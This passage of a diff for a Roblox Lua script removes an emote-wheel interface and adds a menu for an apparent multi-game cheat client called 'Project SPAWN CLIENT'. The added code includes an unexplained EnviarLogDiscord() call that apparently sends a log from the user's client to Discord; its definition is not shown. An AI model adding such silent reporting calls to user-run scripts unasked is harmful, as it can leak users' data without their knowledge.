-    targetCategoryToSave = nil
-    for i, cat in ipairs(emoteData.categories) do
-        local catBtn = Instance.new("TextButton")
-        catBtn.Size = UDim2.new(1, 0, 0, 31); catBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        catBtn.AutoButtonColor = false; catBtn.Text = ""; catBtn.LayoutOrder = i; catBtn.ZIndex = 12; catBtn.Parent = modalScrolling
-        Instance.new("UICorner", catBtn).CornerRadius = UDim.new(0, 7)
-        local cs = Instance.new("UIStroke", catBtn)
-        cs.Color = Color3.fromRGB(255, 255, 255); cs.Thickness = 1.8; cs.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-        local catSun = Instance.new("ImageLabel")
-        catSun.Name = "CatSun"
-        catSun.Size = UDim2.fromOffset(17, 17); catSun.Position = UDim2.new(0, 12, 0.5, -8)
-        catSun.BackgroundTransparency = 1; catSun.Image = ID_ICONE_SOL; catSun.ImageColor3 = Color3.fromRGB(150,150,150); catSun.ZIndex = 12; catSun.Parent = catBtn
-
-        local catText = Instance.new("TextLabel")
-        catText.Size = UDim2.new(1, -60, 1, 0); catText.Position = UDim2.new(0, 38, 0, 0)
-        catText.BackgroundTransparency = 1; catText.Text = cat.name; catText.TextColor3 = Color3.fromRGB(255, 255, 255)
-        catText.TextSize = 13; catText.Font = Enum.Font.Arcade; catText.TextXAlignment = Enum.TextXAlignment.Left; catText.ZIndex = 12; catText.Parent = catBtn
-
-        local catArrow = Instance.new("TextLabel")
-        catArrow.Size = UDim2.new(0, 19, 1, 0); catArrow.Position = UDim2.new(1, -24, 0, 0)
-        catArrow.BackgroundTransparency = 1; catArrow.Text = ">"; catArrow.TextColor3 = Color3.fromRGB(255, 255, 255)
-        catArrow.TextSize = 13; catArrow.Font = Enum.Font.Arcade; catArrow.ZIndex = 12; catArrow.Parent = catBtn
-
-        catBtn.MouseButton1Click:Connect(function()
-            targetCategoryToSave = cat.name
-            for _, b in ipairs(modalScrolling:GetChildren()) do
-                if b:IsA("TextButton") then
-                    local s = b:FindFirstChildOfClass("UIStroke")
-                    if s then s.Thickness = 1.8; s.Color = Color3.fromRGB(255, 255, 255) end
-                    b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                    local sun = b:FindFirstChild("CatSun")
-                    if sun then sun.ImageColor3 = Color3.fromRGB(150,150,150) end
-                end
-            end
-            catBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-            local s = catBtn:FindFirstChildOfClass("UIStroke")
-            if s then s.Thickness = 2 end
-            local selectedSun = catBtn:FindFirstChild("CatSun")
-            if selectedSun then selectedSun.ImageColor3 = Color3.fromRGB(255,255,255) end -- Sol brilha ao selecionar
         end)
-    end
-    saveModal.Visible = true
-end
-
-local saveConfirmBtn = Instance.new("TextButton")
-saveConfirmBtn.Size = UDim2.new(1, -29, 0, 38); saveConfirmBtn.Position = UDim2.new(0, 14, 1, -48)
-saveConfirmBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0); saveConfirmBtn.AutoButtonColor = false
-saveConfirmBtn.Text = ""; saveConfirmBtn.ZIndex = 11; saveConfirmBtn.Parent = saveModal
-Instance.new("UICorner", saveConfirmBtn).CornerRadius = UDim.new(0, 7)
-local sStroke = Instance.new("UIStroke", saveConfirmBtn)
-sStroke.Color = Color3.fromRGB(255, 255, 255); sStroke.Thickness = 1.8; sStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-local saveConfirmIcon = Instance.new("ImageLabel")
-saveConfirmIcon.Size = UDim2.fromOffset(22, 22); saveConfirmIcon.Position = UDim2.new(0.5, -46, 0.5, -11)
-saveConfirmIcon.BackgroundTransparency = 1; saveConfirmIcon.Image = ID_CARTUCHO_SALVAR; saveConfirmIcon.ZIndex = 12; saveConfirmIcon.Parent = saveConfirmBtn
-
-local saveConfirmText = Instance.new("TextLabel")
-saveConfirmText.Size = UDim2.new(0, 84, 1, 0); saveConfirmText.Position = UDim2.new(0.5, -17, 0, 0)
-saveConfirmText.BackgroundTransparency = 1; saveConfirmText.Text = "Salvar"; saveConfirmText.TextColor3 = Color3.fromRGB(255, 255, 255)
-saveConfirmText.TextSize = 16; saveConfirmText.Font = Enum.Font.Arcade; saveConfirmText.TextXAlignment = Enum.TextXAlignment.Left
-saveConfirmText.ZIndex = 12; saveConfirmText.Parent = saveConfirmBtn
-
-saveConfirmBtn.MouseButton1Click:Connect(function()
-    if selectedEmoteItem and targetCategoryToSave then
-        local id = tostring(selectedEmoteItem.AssetId or selectedEmoteItem.Id or selectedEmoteItem.id)
-        local name = selectedEmoteItem.Name or selectedEmoteItem.name or ("Emote_"..id)
-        for _, cat in ipairs(emoteData.categories) do
-            if cat.name == targetCategoryToSave then
-                local exists = false
-                for _, entry in ipairs(cat.emotes) do
-                    local eid = type(entry) == "table" and tostring(entry.id or entry) or tostring(entry)
-                    if eid == id then exists = true; break end
-                end
-                if not exists then table.insert(cat.emotes, {id = tonumber(id) or id, name = name}) end
-                break
-            end
-        end
-        SaveJSON(CATEGORIES_FILE, emoteData)
-        saveModal.Visible = false; buildCategoriesMenu()
-        
-        -- DISPARA A NOTIFICAÇÃO AQUI
-ShowToast(targetCategoryToSave)
-
-        if currentCategory == targetCategoryToSave then loadPage(1) end
-    end
-end)
-
---// SISTEMA VISUAL RADIAL
-local outerCircle = Instance.new("Frame")
-outerCircle.Size = UDim2.new(1, 0, 1, 0)
-outerCircle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-outerCircle.ZIndex = 1
-outerCircle.Parent = wheelFrame
-Instance.new("UICorner", outerCircle).CornerRadius = UDim.new(0.5, 0)
-local outerStroke = Instance.new("UIStroke", outerCircle)
-outerStroke.Color = Color3.fromRGB(255, 255, 255)
-outerStroke.Thickness = 3
-
-local CENTER_RATIO = 0.42
-local centerCircle = Instance.new("Frame")
-centerCircle.Size = UDim2.new(CENTER_RATIO, 0, CENTER_RATIO, 0)
-centerCircle.AnchorPoint = Vector2.new(0.5, 0.5)
-centerCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
-centerCircle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-centerCircle.ZIndex = 5
-centerCircle.Parent = wheelFrame
-Instance.new("UICorner", centerCircle).CornerRadius = UDim.new(0.5, 0)
-local centerStroke = Instance.new("UIStroke", centerCircle)
-centerStroke.Color = Color3.fromRGB(255, 255, 255)
-centerStroke.Thickness = 2
-
-local centerText = Instance.new("TextLabel")
-centerText.Size = UDim2.new(0.8, 0, 0.8, 0)
-centerText.AnchorPoint = Vector2.new(0.5, 0.5)
-centerText.Position = UDim2.new(0.5, 0, 0.5, 0)
-centerText.BackgroundTransparency = 1
-centerText.Text = "Selecione um\nemote"
-centerText.TextColor3 = Color3.fromRGB(255, 255, 255)
-centerText.TextScaled = true
-centerText.Font = Enum.Font.Arcade
-centerText.ZIndex = 6
-centerText.Parent = centerCircle
-
-local radiusTotal = WHEEL_SIZE / 2
-local innerRadius = radiusTotal * CENTER_RATIO
-local outerRadius = radiusTotal
-local slotLabelRadius = (innerRadius + outerRadius) / 2
-local TOTAL_SLOTS = 8
-local SLICE_ANGLE = 360 / TOTAL_SLOTS
-
-for i = 1, TOTAL_SLOTS do
-    local dividerAngleDeg = -90 + ((i - 1) * SLICE_ANGLE) - (SLICE_ANGLE / 2)
-    local dividerAngleRad = math.rad(dividerAngleDeg)
-
-    local x1 = radiusTotal + math.cos(dividerAngleRad) * innerRadius
-    local y1 = radiusTotal + math.sin(dividerAngleRad) * innerRadius
-    local x2 = radiusTotal + math.cos(dividerAngleRad) * outerRadius
-    local y2 = radiusTotal + math.sin(dividerAngleRad) * outerRadius
-
-    local dx, dy = x2 - x1, y2 - y1
-    local lineLength = math.sqrt(dx * dx + dy * dy)
-    local lineAngle = math.deg(math.atan2(dy, dx))
-
-    local line = Instance.new("Frame")
-    line.Size = UDim2.new(0, lineLength, 0, 2)
-    line.AnchorPoint = Vector2.new(0.5, 0.5)
-    line.Position = UDim2.new(0, (x1 + x2) / 2, 0, (y1 + y2) / 2)
-    line.Rotation = lineAngle
-    line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    line.BorderSizePixel = 0
-    line.ZIndex = 3
-    line.Parent = wheelFrame
-end
-
-local HOVER_COLOR = Color3.fromRGB(120, 120, 120)
-local HOVER_TRANSPARENCY = 0.2
-local SELECT_COLOR = Color3.fromRGB(120, 120, 120)
-local SELECT_TRANSPARENCY = 0.2
-
-local sectorSlices = {}
-for i = 1, TOTAL_SLOTS do sectorSlices[i] = {} end
-
-local function angleToSector(angleDeg)
-    local corrected = (angleDeg + 90 + (SLICE_ANGLE / 2)) % 360
-    return math.floor(corrected / SLICE_ANGLE) + 1
-end
-
-local SLICE_STEP = 2
-for rowOffset = 0, (radiusTotal * 2) - 1, SLICE_STEP do
-    local yPix = rowOffset - radiusTotal
-    local currentSector = nil
-    local startX = nil
-
-    for colOffset = 0, (radiusTotal * 2) - 1 do
-        local xPix = colOffset - radiusTotal
-        local dist = math.sqrt(xPix * xPix + yPix * yPix)
-        local sector = nil
-        if dist >= innerRadius and dist <= outerRadius then
-            local angleDeg = math.deg(math.atan2(yPix, xPix))
-            sector = angleToSector(angleDeg)
-        end
-
-        if sector ~= currentSector then
-            if currentSector then
-                local frame = Instance.new("Frame")
-                frame.BorderSizePixel = 0; frame.BackgroundColor3 = HOVER_COLOR; frame.BackgroundTransparency = 1
-                frame.Position = UDim2.fromOffset(startX, rowOffset)
-                frame.Size = UDim2.fromOffset((colOffset - startX) + 0.5, SLICE_STEP + 0.5)
-                frame.ZIndex = 2; frame.Parent = wheelFrame
-                table.insert(sectorSlices[currentSector], frame)
-            end
-            currentSector = sector; startX = colOffset
-        end
-    end
-    if currentSector then
-        local frame = Instance.new("Frame")
-        frame.BorderSizePixel = 0; frame.BackgroundColor3 = HOVER_COLOR; frame.BackgroundTransparency = 1
-        frame.Position = UDim2.fromOffset(startX, rowOffset)
-        frame.Size = UDim2.fromOffset(((radiusTotal * 2) - startX) + 0.5, SLICE_STEP + 0.5)
-        frame.ZIndex = 2; frame.Parent = wheelFrame
-        table.insert(sectorSlices[currentSector], frame)
-    end
-end
-
-local hoveredIndex = nil
-local selectedIndex = nil
-local lastHovered = nil
-local lastSelected = nil
-
-local function applySectorVisual(index)
-    if not index then return end
-    local isSelected = (index == selectedIndex)
-    local isHovered = (index == hoveredIndex)
-
-    local targetTransparency = 1
-    if isSelected then targetTransparency = SELECT_TRANSPARENCY
-    elseif isHovered then targetTransparency = HOVER_TRANSPARENCY end
-
-    for _, frame in ipairs(sectorSlices[index] or {}) do
-        TweenService:Create(frame, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
-            BackgroundTransparency = targetTransparency
-        }):Play()
-    end
-end
-
-local function renderRadialState()
-    local changed = {}
-    if lastHovered then changed[lastHovered] = true end
-    if lastSelected then changed[lastSelected] = true end
-    if hoveredIndex then changed[hoveredIndex] = true end
-    if selectedIndex then changed[selectedIndex] = true end
-    for i in pairs(changed) do applySectorVisual(i) end
-    lastHovered = hoveredIndex; lastSelected = selectedIndex
-end
-
-local function getSectorFromPosition(position)
-    if not wheelFrame or not wheelFrame.Visible then return nil end
-    local abs = wheelFrame.AbsolutePosition; local size = wheelFrame.AbsoluteSize
-    local center = Vector2.new(abs.X + size.X / 2, abs.Y + size.Y / 2)
-    local dx = position.X - center.X; local dy = position.Y - center.Y
-    local dist = math.sqrt(dx * dx + dy * dy)
-    if dist < innerRadius - 2 or dist > outerRadius + 2 then return nil end
-    return angleToSector(math.deg(math.atan2(dy, dx)))
-end
-
---// SLOTS
-for i = 1, TOTAL_SLOTS do
-    local slotAngleDeg = ((i - 1) * SLICE_ANGLE) - 90
-    local slotAngleRad = math.rad(slotAngleDeg)
-    local slotX = radiusTotal + (math.cos(slotAngleRad) * slotLabelRadius)
-    local slotY = radiusTotal + (math.sin(slotAngleRad) * slotLabelRadius)
-
-    local slotButton = Instance.new("TextButton")
-    slotButton.Size = UDim2.fromOffset(60, 60)
-    slotButton.AnchorPoint = Vector2.new(0.5, 0.5)
-    slotButton.Position = UDim2.fromOffset(slotX, slotY)
-    slotButton.BackgroundTransparency = 1
-    slotButton.Text = ""
-    slotButton.ZIndex = 6
-    slotButton.Parent = wheelFrame
-
-    local slotImg = Instance.new("ImageLabel")
-    slotImg.Size = UDim2.new(0.8, 0, 0.8, 0)
-    slotImg.AnchorPoint = Vector2.new(0.5, 0.5)
-    slotImg.Position = UDim2.new(0.5, 0, 0.5, 0)
-    slotImg.BackgroundTransparency = 1
-    slotImg.ScaleType = Enum.ScaleType.Fit
-    slotImg.ZIndex = 6
-    slotImg.Parent = slotButton
-
-    local slotText = Instance.new("TextLabel")
-    slotText.Size = UDim2.new(1, 0, 1, 0)
-    slotText.BackgroundTransparency = 1; slotText.Text = tostring(i)
-    slotText.TextColor3 = Color3.fromRGB(255, 255, 255); slotText.TextSize = 18
-    slotText.Font = Enum.Font.Arcade; slotText.ZIndex = 6; slotText.Parent = slotButton
-
-    local starBtn = Instance.new("ImageButton")
-    starBtn.Size = UDim2.fromOffset(20, 20)
-    starBtn.AnchorPoint = Vector2.new(1, 1)
-    starBtn.Position = UDim2.new(1, 4, 1, 4)
-    starBtn.BackgroundTransparency = 1
-    starBtn.Image = ID_ESTRELA
-    starBtn.ImageColor3 = Color3.fromRGB(150, 150, 150)
-    starBtn.Visible = false
-    starBtn.ZIndex = 7
-    starBtn.Parent = slotButton
-
-    starBtn.MouseButton1Click:Connect(function()
-        local item = catalogItems[i]
-        if not item then return end
-        local idStr = tostring(item.id or item.AssetId or item.Id)
-        
-        local foundIdx = nil
-        for idx, sId in ipairs(starredEmotes) do
-            if tostring(sId) == idStr then foundIdx = idx; break end
-        end
-
-        if foundIdx then
-            table.remove(starredEmotes, foundIdx)
-            starBtn.ImageColor3 = Color3.fromRGB(150, 150, 150)
-        else
-            table.insert(starredEmotes, idStr)
-            starBtn.ImageColor3 = Color3.fromRGB(255, 255, 255)
-        end
-        SaveJSON(STARRED_FILE, starredEmotes)
-        applySearchLocal(currentKeyword)
-        updateWheelSlots()
     end)
-
-    slotButton.MouseButton1Click:Connect(function()
-        local item = catalogItems[i]
-        if item then
-            selectedIndex = i; renderRadialState()
-            selectedEmoteItem = item
-            centerText.Text = item.name or item.Name or "Emote"
-            cartridgeButton.Visible = true
-            LoadTrack(item.id or item.AssetId or item.Id)
-            mainContainer.Visible = false
-            toggleButton.Visible = true 
-        end
-    end)
-
-    slotButton.MouseEnter:Connect(function() hoveredIndex = i; renderRadialState() end)
-    slotButton.MouseLeave:Connect(function() if hoveredIndex == i then hoveredIndex = nil; renderRadialState() end end)
-
-    slotButtons[i] = slotButton
-    slotImages[i] = slotImg
-    slotTexts[i] = slotText
-    slotStars[i] = starBtn
 end
 
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if not mainContainer.Visible then return end
+EnviarLogDiscord()
 
+local TweenService, CoreGui, UIS = game:GetService("TweenService"), game:GetService("CoreGui"), game:GetService("UserInputService")
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local function Create(className, parent, props, corner, stroke)
+    local obj = Instance.new(className)
+    for k, v in pairs(props or {}) do obj[k] = v end
+    if corner then Instance.new("UICorner", obj).CornerRadius = UDim.new(0, corner) end
+    if stroke then
+        local str = Instance.new("UIStroke", obj)
+        for k, v in pairs(stroke) do str[k] = v end
+    end
+    if parent then obj.Parent = parent end
+    return obj
+end
+
+local targetParent = (pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui")) or PlayerGui
+
+local ScreenGui = Create("ScreenGui", targetParent, {
+    Name = "BrookHaven_V16_Final", 
+    ResetOnSpawn = false, 
+    IgnoreGuiInset = true,
+    DisplayOrder = 1,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+})
+
+local UiScale = Instance.new("UIScale", ScreenGui)
+local function UpdateUIScale()
+    if not UIS.TouchEnabled then
+        UiScale.Scale = 1.9
+    else
+        UiScale.Scale = 1.0
+    end
+end
+UIS.GetPropertyChangedSignal(UIS, "TouchEnabled"):Connect(UpdateUIScale)
+UpdateUIScale()
+
+local ClickSound = Create("Sound", ScreenGui, {SoundId = "rbxassetid://118415301510285", Volume = 1})
+
+local function PlayClickSound()
+    if ClickSound.IsPlaying then ClickSound:Stop() end
+    ClickSound:Play()
+end
+
+local DarkOverlay = Create("Frame", ScreenGui, {
+    Name = "DarkOverlay",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(3, 0, 3, 0),
+    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+    BackgroundTransparency = 0.25,
+    BorderSizePixel = 0,
+    Visible = true,
+    ZIndex = 1
+})
+
+local OpenBtn = Create("ImageButton", ScreenGui, {
+    Name = "OpenBtn", 
+    Position = UDim2.new(0, 50, 0, 55), 
+    AnchorPoint = Vector2.new(0.5, 0), 
+    Size = UDim2.new(0, 80, 0, 80), 
+    BackgroundTransparency = 1, 
+    Image = "rbxassetid://131615335465809", 
+    ImageTransparency = 0, 
+    Visible = true,
+    ZIndex = 50
+})
+
+local MainFrame = Create("Frame", ScreenGui, {Name = "MainFrame", AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0, 420, 0, 310), BackgroundColor3 = Color3.fromRGB(0,0,0), BorderSizePixel = 0, Active = true, Draggable = true, Visible = true, ZIndex = 10}, 8, {Color = Color3.fromRGB(255, 255, 255), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
+
+local dragToggle, dragStart, startPos
+OpenBtn.InputBegan:Connect(function(input)
+    if MainFrame.Visible then return end
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        local pos = Vector2.new(input.Position.X, input.Position.Y)
-        
-        local function isPointInside(guiObject)
-            if not guiObject or not guiObject.Visible then return false end
-            local absPos = guiObject.AbsolutePosition
-            local absSize = guiObject.AbsoluteSize
-            return (pos.X >= absPos.X and pos.X <= absPos.X + absSize.X and
-                    pos.Y >= absPos.Y and pos.Y <= absPos.Y + absSize.Y)
-        end
-
-        local clickedInside = false
-        if isPointInside(wheelFrame) then clickedInside = true end
-        if isPointInside(topBar) then clickedInside = true end
-        if isPointInside(navContainer) then clickedInside = true end
-        if sidePanel.Visible and isPointInside(sidePanel) then clickedInside = true end
-        if saveModal.Visible and isPointInside(saveModal) then clickedInside = true end
-
-        if not clickedInside then
-            mainContainer.Visible = false
-            toggleButton.Visible = true
-            hoveredIndex = nil
-            renderRadialState()
-            return
-        end
-
-        local idx = getSectorFromPosition(pos)
-        if idx and catalogItems[idx] then
-            selectedIndex = idx; hoveredIndex = idx; renderRadialState()
-            local item = catalogItems[idx]
-            selectedEmoteItem = item
-            centerText.Text = item.name or item.Name or "Emote"
-            cartridgeButton.Visible = true
-            LoadTrack(item.id or item.AssetId or item.Id)
-            
-            mainContainer.Visible = false 
-            toggleButton.Visible = true
+        dragToggle, dragStart, startPos = true, input.Position, OpenBtn.Position
+        if OpenBtn.AnchorPoint ~= Vector2.new(0, 0) then
+            OpenBtn.AnchorPoint = Vector2.new(0, 0)
+            OpenBtn.Position = UDim2.new(0, OpenBtn.AbsolutePosition.X, 0, OpenBtn.AbsolutePosition.Y)
         end
     end
 end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if not mainContainer.Visible then return end
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        local idx = getSectorFromPosition(Vector2.new(input.Position.X, input.Position.Y))
-        if idx ~= hoveredIndex then hoveredIndex = idx; renderRadialState() end
+UIS.InputChanged:Connect(function(input)
+    if MainFrame.Visible then 
+        dragToggle = false 
+        return 
+    end
+    if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        OpenBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
-
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch then
-        if hoveredIndex then hoveredIndex = nil; renderRadialState() end
-    end
+UIS.InputEnded:Connect(function(input) 
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+        dragToggle = false 
+    end 
 end)
 
-updateWheelSlots = function()
-    for i = 1, TOTAL_SLOTS do
-        local item = catalogItems[i]
-        local img = slotImages[i]
-        local txt = slotTexts[i]
-        local star = slotStars[i]
+local HeaderBar = Create("Frame", MainFrame, {Size = UDim2.new(1, 0, 0, 65), BackgroundTransparency = 1, ZIndex = 11})
+local Title = Create("TextLabel", HeaderBar, {Size = UDim2.new(1, 0, 0, 50), Position = UDim2.new(0, 0, 0, 5), BackgroundTransparency = 1, Text = "Sobre o ᓵ⚍ʖリ╎ℸ ", TextColor3 = Color3.fromRGB(255,255,255), TextSize = 28, Font = Enum.Font.Arcade, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 11})
+Create("Frame", HeaderBar, {Name = "WhiteSeparator", Size = UDim2.new(1, -20, 0, 7), Position = UDim2.new(0.5, 0, 0, 58), AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(255,255,255), BorderSizePixel = 0, ZIndex = 11})
 
-        if item then
-            txt.Visible = false
-            local eid = tostring(item.id or item.AssetId or item.Id)
-            img.Image = "rbxthumb://type=Asset&id=" .. eid .. "&w=150&h=150"
-            img.Visible = true
-            star.Visible = true
-            
-            local isStar = false
-            for _, sId in ipairs(starredEmotes) do if tostring(sId) == eid then isStar = true; break end end
-            star.ImageColor3 = isStar and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 150)
-        else
-            txt.Visible = true
-            img.Image = ""
-            img.Visible = false
-            star.Visible = false
-        end
+local LeftBtn = Create("TextButton", HeaderBar, {Size = UDim2.new(0, 38, 0, 38), Position = UDim2.new(0, 10, 0, 10), BackgroundColor3 = Color3.fromRGB(255,255,255), Text = "<", TextColor3 = Color3.fromRGB(0,0,0), TextSize = 28, Font = Enum.Font.SourceSansBold, Visible = false, ZIndex = 12}, 6)
+local RightBtn = Create("TextButton", HeaderBar, {Size = UDim2.new(0, 38, 0, 38), Position = UDim2.new(1, -48, 0, 10), BackgroundColor3 = Color3.fromRGB(255,255,255), Text = ">", TextColor3 = Color3.fromRGB(0,0,0), TextSize = 28, Font = Enum.Font.SourceSansBold, ZIndex = 12}, 6)
+
+local PageAbout = Create("ScrollingFrame", MainFrame, {
+    Size = UDim2.new(1, -20, 1, -135), 
+    Position = UDim2.new(0, 10, 0, 68), 
+    BackgroundTransparency = 1, 
+    CanvasSize = UDim2.new(0, 0, 0, 780),
+    ScrollBarThickness = 3, 
+    ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255),
+    ScrollingDirection = Enum.ScrollingDirection.Y, 
+    Visible = true, 
+    ZIndex = 11
+})
+
+local WelcomeCard = Create("Frame", PageAbout, {
+    Size = UDim2.new(1, -10, 0, 58),
+    Position = UDim2.new(0, 2, 0, 4),
+    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+    ZIndex = 11
+}, 6, {Color = Color3.fromRGB(255, 255, 255), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
+
+local IconWelcome = Create("ImageLabel", WelcomeCard, {
+    Size = UDim2.new(0, 42, 0, 42),
+    Position = UDim2.new(0, 8, 0.5, -21),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://114065081553101",
+    ZIndex = 12
+})
+
+local WelcomeLabel = Create("TextLabel", WelcomeCard, {
+    Size = UDim2.new(1, -60, 0, 22),
+    Position = UDim2.new(0, 58, 0, 8),
+    BackgroundTransparency = 1,
+    Text = "BEM-VINDO | <font color=\"#FFFFFF\">" .. LocalPlayer.DisplayName .. "</font>",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 14,
+    Font = Enum.Font.Arcade,
+    RichText = true,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 12
+})
+
+local SubTitleLabel = Create("TextLabel", WelcomeCard, {
+    Size = UDim2.new(1, -60, 0, 18),
+    Position = UDim2.new(0, 58, 0, 30),
+    BackgroundTransparency = 1,
+    Text = "SPWAN Community project under development",
+    TextColor3 = Color3.fromRGB(200, 200, 200),
+    TextSize = 11,
+    Font = Enum.Font.Arcade,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 12
+})
+
+local MonitorCard = Create("Frame", PageAbout, {
+    Size = UDim2.new(1, -10, 0, 95),
+    Position = UDim2.new(0, 2, 0, 68),
+    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+    ZIndex = 11
+}, 6, {Color = Color3.fromRGB(255, 255, 255), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
+
+local MonitorTitle = Create("TextLabel", MonitorCard, {
+    Size = UDim2.new(1, -16, 0, 18),
+    Position = UDim2.new(0, 8, 0, 6),
+    BackgroundTransparency = 1,
+    Text = "[ MONITORAMENTO DO SERVIDOR ]",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 12,
+    Font = Enum.Font.Arcade,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 12
+})
+
+local PlayersCountLabel = Create("TextLabel", MonitorCard, {
+    Size = UDim2.new(1, -16, 0, 18),
+    Position = UDim2.new(0, 8, 0, 26),
+    BackgroundTransparency = 1,
+    Text = "Jogadores no Servidor: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 12,
+    Font = Enum.Font.Arcade,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 12
+})
+
+local function UpdatePlayerCount()
+    PlayersCountLabel.Text = "Jogadores no Servidor: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+end
+Players.PlayerAdded:Connect(UpdatePlayerCount)
+Players.PlayerRemoving:Connect(UpdatePlayerCount)
+
+Create("Frame", MonitorCard, {
+    Size = UDim2.new(1, -16, 0, 1),
+    Position = UDim2.new(0, 8, 0, 50),
+    BackgroundColor3 = Color3.fromRGB(150, 150, 150),
+    BorderSizePixel = 0,
+    ZIndex = 12
+})
+
+local TipIcon = Create("TextLabel", MonitorCard, {
+    Size = UDim2.new(0, 16, 0, 16),
+    Position = UDim2.new(0, 8, 0, 62),
+    BackgroundTransparency = 1,
+    Text = "ⓘ",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 14,
+    Font = Enum.Font.SourceSansBold,
+    ZIndex = 12
+})
+
+local TipLabel = Create("TextLabel", MonitorCard, {
+    Size = UDim2.new(1, -30, 0, 30),
+    Position = UDim2.new(0, 26, 0, 56),
+    BackgroundTransparency = 1,
+    Text = "Dica : Algumas Funções São desligadas Completamente Dando um Duplo Click Rápido.",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 10,
+    Font = Enum.Font.Arcade,
+    TextWrapped = true,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 12
+})
+
+Create("TextLabel", PageAbout, {
+    Size = UDim2.new(1, -10, 0, 450),
+    Position = UDim2.new(0, 2, 0, 172),
+    BackgroundTransparency = 1,
+    Text = '// ACCESS LOG] O Project SPWN CLIENT consiste na criação de um script com funções universais, desenvolvido para se expandir por diversos jogos da plataforma Roblox. O objective do projeto é explorar, desenvolver e reunir todo tipo de sistema, ferramenta e ideia que possa ser aplicada em diferentes experiências, sempre trazendo novas funcionalidades e buscando inovação. Além de criar sistemas para diversos jogos, o Project SPAWN CLIENT também tem como objetivo construir uma comunidade de desenvolvedores interessados em compartilhar conhecimento, ensinar o desenvolvimento de projetos e trocar experiências sobre Vibe Coding. Se você deseja fazer parte do Project SPAWN CLIENT, conhecer mais sobre a iniciativa ou contribuir com ideias, desenvolver sistemas, criar designs ou acompanhar sua evolução, entre no servidor do Discord do Project ( Signature CHROLLO)',
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 13,
+    Font = Enum.Font.Arcade,
+    TextWrapped = true,
+    RichText = true,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Top,
+    ZIndex = 11
+})
+
+local SymbolAboutImage = Create("ImageLabel", PageAbout, {
+    Name = "SymbolAboutImage",
+    Size = UDim2.new(0, 120, 0, 120),
+    Position = UDim2.new(0.5, 0, 0, 630),
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://85337967115080",
+    ImageColor3 = Color3.fromRGB(255, 255, 255),
+    ZIndex = 11
+})
+Create("UIAspectRatioConstraint", SymbolAboutImage, {AspectRatio = 1})
+
+local PageScripts = Create("ScrollingFrame", MainFrame, {Size = UDim2.new(1, -15, 1, -145), Position = UDim2.new(0, 8, 0, 75), BackgroundTransparency = 1, Visible = false, CanvasSize = UDim2.new(0, 0, 0, 770), ScrollBarThickness = 3, ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255), ZIndex = 11})
+Create("UIGridLayout", PageScripts, {CellSize = UDim2.new(0, 96, 0, 52), CellPadding = UDim2.new(0, 5, 0, 6), HorizontalAlignment = Enum.HorizontalAlignment.Center})
+
